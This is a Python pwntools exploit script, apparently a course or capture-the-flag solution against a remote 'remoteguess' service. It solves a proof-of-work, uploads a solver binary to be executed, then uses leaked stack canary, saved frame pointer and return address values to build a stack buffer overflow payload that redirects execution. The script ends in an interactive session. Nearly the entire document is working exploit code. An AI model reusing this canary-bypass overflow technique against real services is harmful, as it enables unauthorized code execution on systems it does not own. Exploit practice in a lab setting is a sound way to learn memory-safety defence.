#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()
# print("payload=",payload)
# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

r.readline(0)
canary=p64(int(r.readline(0),16))
print("canary = ",canary)

rbp=p64(int(r.readline(0),16))
print("rbp = ",rbp)

ret=p64(int(r.readline(0),16)+171)
print("ret = ",ret)

payload=b'0' + b' ' * 23
# payload+=0xdeadbeef
payload+=canary
payload+=rbp
payload+=ret
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)

r.sendafter(b'Show me your answer? ',payload)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
